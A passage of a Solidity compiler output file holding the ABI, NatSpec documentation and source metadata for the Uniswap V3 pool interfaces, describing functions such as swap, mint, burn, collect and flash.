owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0New\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1New\",\"type\":\"uint8\"}],\"name\":\"SetFeeProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"liquidity\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collect\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collectProtocol\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fee\",\"outputs\":[{\"internalType\":\"uint24\",\"name\":\"\",\"type\":\"uint24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeGrowthGlobal0X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeGrowthGlobal1X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"flash\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"}],\"name\":\"increaseObservationCardinalityNext\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"}],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidity\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidityPerTick\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"observations\",\"outputs\":[{\"internalType\":\"uint32\",\"name\":\"blockTimestamp\",\"type\":\"uint32\"},{\"internalType\":\"int56\",\"name\":\"tickCumulative\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityCumulativeX128\",\"type\":\"uint160\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint32[]\",\"name\":\"secondsAgos\",\"type\":\"uint32[]\"}],\"name\":\"observe\",\"outputs\":[{\"internalType\":\"int56[]\",\"name\":\"tickCumulatives\",\"type\":\"int56[]\"},{\"internalType\":\"uint160[]\",\"name\":\"secondsPerLiquidityCumulativeX128s\",\"type\":\"uint160[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"key\",\"type\":\"bytes32\"}],\"name\":\"positions\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"_liquidity\",\"type\":\"uint128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside0LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside1LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"protocolFees\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"token0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"token1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"feeProtocol0\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol1\",\"type\":\"uint8\"}],\"name\":\"setFeeProtocol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"slot0\",\"outputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"},{\"internalType\":\"uint16\",\"name\":\"observationIndex\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinality\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol\",\"type\":\"uint8\"},{\"internalType\":\"bool\",\"name\":\"unlocked\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"}],\"name\":\"snapshotCumulativesInside\",\"outputs\":[{\"internalType\":\"int56\",\"name\":\"tickCumulativeInside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityInsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsInside\",\"type\":\"uint32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"zeroForOne\",\"type\":\"bool\"},{\"internalType\":\"int256\",\"name\":\"amountSpecified\",\"type\":\"int256\"},{\"internalType\":\"uint160\",\"name\":\"sqrtPriceLimitX96\",\"type\":\"uint160\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[{\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int16\",\"name\":\"wordPosition\",\"type\":\"int16\"}],\"name\":\"tickBitmap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tickSpacing\",\"outputs\":[{\"internalType\":\"int24\",\"name\":\"\",\"type\":\"int24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"ticks\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"liquidityGross\",\"type\":\"uint128\"},{\"internalType\":\"int128\",\"name\":\"liquidityNet\",\"type\":\"int128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside0X128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside1X128\",\"type\":\"uint256\"},{\"internalType\":\"int56\",\"name\":\"tickCumulativeOutside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityOutsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsOutside\",\"type\":\"uint32\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"The pool interface is broken up into many smaller pieces\",\"methods\":{\"burn(int24,int24,uint128)\":{\"details\":\"Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect\",\"params\":{\"amount\":\"How much liquidity to burn\",\"tickLower\":\"The lower tick of the position for which to burn liquidity\",\"tickUpper\":\"The upper tick of the position for which to burn liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 sent to the recipient\",\"amount1\":\"The amount of token1 sent to the recipient\"}},\"collect(address,int24,int24,uint128,uint128)\":{\"details\":\"Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\",\"params\":{\"amount0Requested\":\"How much token0 should be withdrawn from the fees owed\",\"amount1Requested\":\"How much token1 should be withdrawn from the fees owed\",\"recipient\":\"The address which should receive the fees collected\",\"tickLower\":\"The lower tick of the position for which to collect fees\",\"tickUpper\":\"The upper tick of the position for which to collect fees\"},\"returns\":{\"amount0\":\"The amount of fees collected in token0\",\"amount1\":\"The amount of fees collected in token1\"}},\"collectProtocol(address,uint128,uint128)\":{\"params\":{\"amount0Requested\":\"The maximum amount of token0 to send, can be 0 to collect fees in only token1\",\"amount1Requested\":\"The maximum amount of token1 to send, can be 0 to collect fees in only token0\",\"recipient\":\"The address to which collected protocol fees should be sent\"},\"returns\":{\"amount0\":\"The protocol fee collected in token0\",\"amount1\":\"The protocol fee collected in token1\"}},\"feeGrowthGlobal0X128()\":{\"details\":\"This value can overflow the uint256\"},\"feeGrowthGlobal1X128()\":{\"details\":\"This value can overflow the uint256\"},\"flash(address,uint256,uint256,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback\",\"params\":{\"amount0\":\"The amount of token0 to send\",\"amount1\":\"The amount of token1 to send\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address which will receive the token0 and token1 amounts\"}},\"increaseObservationCardinalityNext(uint16)\":{\"details\":\"This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.\",\"params\":{\"observationCardinalityNext\":\"The desired minimum number of observations for the pool to store\"}},\"initialize(uint160)\":{\"details\":\"Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\",\"params\":{\"sqrtPriceX96\":\"the initial sqrt price of the pool as a Q64.96\"}},\"liquidity()\":{\"details\":\"This value has no relationship to the total liquidity across all ticks\"},\"maxLiquidityPerTick()\":{\"details\":\"This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\",\"returns\":{\"_0\":\"The max amount of liquidity per tick\"}},\"mint(address,int24,int24,uint128,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.\",\"params\":{\"amount\":\"The amount of liquidity to mint\",\"data\":\"Any data that should be passed through to the callback\",\"recipient\":\"The address for which the liquidity will be created\",\"tickLower\":\"The lower tick of the position in which to add liquidity\",\"tickUpper\":\"The upper tick of the position in which to add liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\",\"amount1\":\"The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\"}},\"observations(uint256)\":{\"details\":\"You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.\",\"params\":{\"index\":\"The element of the observations array to fetch\"},\"returns\":{\"blockTimestamp\":\"The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use\"}},\"observe(uint32[])\":{\"details\":\"To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\",\"params\":{\"secondsAgos\":\"From how long ago each cumulative tick and liquidity value should be returned\"},\"returns\":{\"secondsPerLiquidityCumulativeX128s\":\"Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp\",\"tickCumulatives\":\"Cumulative tick values as of each `secondsAgos` from the current block timestamp\"}},\"positions(bytes32)\":{\"params\":{\"key\":\"The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\"},\"returns\":{\"_liquidity\":\"The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke\"}},\"protocolFees()\":{\"details\":\"Protocol fees will never exceed uint128 max in either token\"},\"setFeeProtocol(uint8,uint8)\":{\"params\":{\"feeProtocol0\":\"new protocol fee for token0 of the pool\",\"feeProtocol1\":\"new protocol fee for token1 of the pool\"}},\"snapshotCumulativesInside(int24,int24)\":{\"details\":\"Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.\",\"params\":{\"tickLower\":\"The lower tick of the range\",\"tickUpper\":\"The upper tick of the range\"},\"returns\":{\"secondsInside\":\"The snapshot of seconds per liquidity for the range\",\"secondsPerLiquidityInsideX128\":\"The snapshot of seconds per liquidity for the range\",\"tickCumulativeInside\":\"The snapshot of the tick accumulator for the range\"}},\"swap(address,bool,int256,uint160,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\",\"params\":{\"amountSpecified\":\"The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address to receive the output of the swap\",\"sqrtPriceLimitX96\":\"The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap\",\"zeroForOne\":\"The direction of the swap, true for token0 to token1, false for token1 to token0\"},\"returns\":{\"amount0\":\"The delta of the balance of token0 of the pool, exact when negative, minimum when positive\",\"amount1\":\"The delta of the balance of token1 of the pool, exact when negative, minimum when positive\"}},\"tickSpacing()\":{\"details\":\"Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.\",\"returns\":{\"_0\":\"The tick spacing\"}},\"ticks(int24)\":{\"params\":{\"tick\":\"The tick to look up\"},\"returns\":{\"liquidityGross\":\"the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position.\"}}},\"title\":\"The interface for a Uniswap V3 Pool\"},\"userdoc\":{\"methods\":{\"burn(int24,int24,uint128)\":{\"notice\":\"Burn liquidity from the sender and account tokens owed for the liquidity to the position\"},\"collect(address,int24,int24,uint128,uint128)\":{\"notice\":\"Collects tokens owed to a position\"},\"collectProtocol(address,uint128,uint128)\":{\"notice\":\"Collect the protocol fee accrued to the pool\"},\"factory()\":{\"notice\":\"The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\"},\"fee()\":{\"notice\":\"The pool's fee in hundredths of a bip, i.e. 1e-6\"},\"feeGrowthGlobal0X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\"},\"feeGrowthGlobal1X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\"},\"flash(address,uint256,uint256,bytes)\":{\"notice\":\"Receive token0 and/or token1 and pay it back, plus a fee, in the callback\"},\"increaseObservationCardinalityNext(uint16)\":{\"notice\":\"Increase the maximum number of price and liquidity observations that this pool will store\"},\"initialize(uint160)\":{\"notice\":\"Sets the initial price for the pool\"},\"liquidity()\":{\"notice\":\"The currently in range liquidity available to the pool\"},\"maxLiquidityPerTick()\":{\"notice\":\"The maximum amount of position liquidity that can use any tick in the range\"},\"mint(address,int24,int24,uint128,bytes)\":{\"notice\":\"Adds liquidity for the given recipient/tickLower/tickUpper position\"},\"observations(uint256)\":{\"notice\":\"Returns data about a specific observation index\"},\"observe(uint32[])\":{\"notice\":\"Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\"},\"positions(bytes32)\":{\"notice\":\"Returns the information about a position by the position's key\"},\"protocolFees()\":{\"notice\":\"The amounts of token0 and token1 that are owed to the protocol\"},\"setFeeProtocol(uint8,uint8)\":{\"notice\":\"Set the denominator of the protocol's % share of the fees\"},\"slot0()\":{\"notice\":\"The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally.\"},\"snapshotCumulativesInside(int24,int24)\":{\"notice\":\"Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\"},\"swap(address,bool,int256,uint160,bytes)\":{\"notice\":\"Swap token0 for token1, or token1 for token0\"},\"tickBitmap(int16)\":{\"notice\":\"Returns 256 packed tick initialized boolean values. See TickBitmap for more information\"},\"tickSpacing()\":{\"notice\":\"The pool tick spacing\"},\"ticks(int24)\":{\"notice\":\"Look up information about a specific tick in the pool\"},\"token0()\":{\"notice\":\"The first of the two tokens of the pool, sorted by address\"},\"token1()\":{\"notice\":\"The second of the two tokens of the pool, sorted by address\"}},\"notice\":\"A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform to the ERC20 specification\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\":\"IUniswapV3Pool\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\":{\"keccak256\":\"0xfe6113d518466cd6652c85b111e01f33eb62157f49ae5ed7d5a3947a2044adb1\",\"urls\":[\"bzz-raw://1c42b9e6f5902ac38dd43e25750939baa7e0c1425dc75afd717c4412731065d5\",\"dweb:/ipfs/QmWaoacnzsucTvBME2o7YgZBZMhaHv7fkj83htHMVWJKWh\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":{\"keccak256\":\"0x9453dd0e7442188667d01d9b65de3f1e14e9511ff3e303179a15f6fc267f7634\",\"urls\":[\"bzz-raw://982f4328f956c3e60e67501e759eb292ac487f76460c774c50e9ae4fcc92aae5\",\"dweb:/ipfs/QmRnzEDsaqtd9PJEVcgQi7p5aV5pMSvRUoGZJAdwFUJxgZ\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":{\"keccak256\":\"0xe603ac5b17ecdee73ba2b27efdf386c257a19c14206e87eee77e2017b742d9e5\",\"urls\":[\"bzz-raw://8febc9bdb399a4d94bb89f5377732652e2400e4a8dee808201ade6848f9004e7\",\"dweb:/ipfs/QmaKDqYYFU4d2W2iN77aDHptfbFmYZRrMYXHeGpJmM8C1c\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":{\"keccak256\":\"0x8071514d0fe5d17d6fbd31c191cdfb703031c24e0ece3621d88ab10e871375cd\",\"urls\":[\"bzz-raw://d0b571930cc7488b1d546a7e9cea7c52d8b3c4e207da657ed0e0db7343b8cd03\",\"dweb:/ipfs/QmaGK6vVwB95QSTR1XMYvrh7ivYAYZxi3fD7v6VMA4jZ39\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":{\"keccak256\":\"0xf6e5d2cd1139c4c276bdbc8e1d2b256e456c866a91f1b868da265c6d2685c3f7\",\"urls\":[\"bzz-raw://b99c8c9ae8e27ee6559e5866bea82cbc9ffc8247f8d15b7422a4deb287d4d047\",\"dweb:/ipfs/QmfL8gaqt3ffAnm6nVj5ksuNpLygXuL3xq5VBqrkwC2JJ3\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":{\"keccak256\":\"0x759b78a2918af9e99e246dc3af084f654e48ef32bb4e4cb8a966aa3dcaece235\",\"urls\":[\"bzz-raw://64144fb96e1c7fdba87305acadb98a198d26a3d46c097cb3a666e567f6f29735\",\"dweb:/ipfs/QmUnWVwN9FKB9uV5Pr8YfLpWZnYM2DENnRMaadZ492JS9u\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":{\"keccak256\":\"0x852dc1f5df7dcf7f11e7bb3eed79f0cea72ad4b25f6a9d2c35aafb48925fd49f\",\"urls\":[\"bzz-raw://ed63907c38ff36b0e22bc9ffc53e791ea74f0d4f0e7c257fdfb5aaf8825b1f0f\",\"dweb:/ipfs/QmSQrckghEjs6HVsA5GVgpNpZWvTXMY5eQLF7cN6deFeEg\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"burn(int24,int24,uint128)": {
								"notice": "Burn liquidity from the sender and account tokens owed for the liquidity to the position"
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"notice": "Collects tokens owed to a position"
							},
							"collectProtocol(address,uint128,uint128)": {
								"notice": "Collect the protocol fee accrued to the pool"
							},
							"factory()": {
								"notice": "The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface"
							},
							"fee()": {
								"notice": "The pool's fee in hundredths of a bip, i.e. 1e-6"
							},
							"feeGrowthGlobal0X128()": {
								"notice": "The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool"
							},
							"feeGrowthGlobal1X128()": {
								"notice": "The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool"
							},
							"flash(address,uint256,uint256,bytes)": {
								"notice": "Receive token0 and/or token1 and pay it back, plus a fee, in the callback"
							},
							"increaseObservationCardinalityNext(uint16)": {
								"notice": "Increase the maximum number of price and liquidity observations that this pool will store"
							},
							"initialize(uint160)": {
								"notice": "Sets the initial price for the pool"
							},
							"liquidity()": {
								"notice": "The currently in range liquidity available to the pool"
							},
							"maxLiquidityPerTick()": {
								"notice": "The maximum amount of position liquidity that can use any tick in the range"
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"notice": "Adds liquidity for the given recipient/tickLower/tickUpper position"
							},
							"observations(uint256)": {
								"notice": "Returns data about a specific observation index"
							},
							"observe(uint32[])": {
								"notice": "Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp"
							},
							"positions(bytes32)": {
								"notice": "Returns the information about a position by the position's key"
							},
							"protocolFees()": {
								"notice": "The amounts of token0 and token1 that are owed to the protocol"
							},
							"setFeeProtocol(uint8,uint8)": {
								"notice": "Set the denominator of the protocol's % share of the fees"
							},
							"slot0()": {
								"notice": "The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally."
							},
							"snapshotCumulativesInside(int24,int24)": {
								"notice": "Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range"
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"notice": "Swap token0 for token1, or token1 for token0"
							},
							"tickBitmap(int16)": {
								"notice": "Returns 256 packed tick initialized boolean values. See TickBitmap for more information"
							},
							"tickSpacing()": {
								"notice": "The pool tick spacing"
							},
							"ticks(int24)": {
								"notice": "Look up information about a specific tick in the pool"
							},
							"token0()": {
								"notice": "The first of the two tokens of the pool, sorted by address"
							},
							"token1()": {
								"notice": "The second of the two tokens of the pool, sorted by address"
							}
						},
						"notice": "A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform to the ERC20 specification"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol": {
				"IUniswapV3PoolActions": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
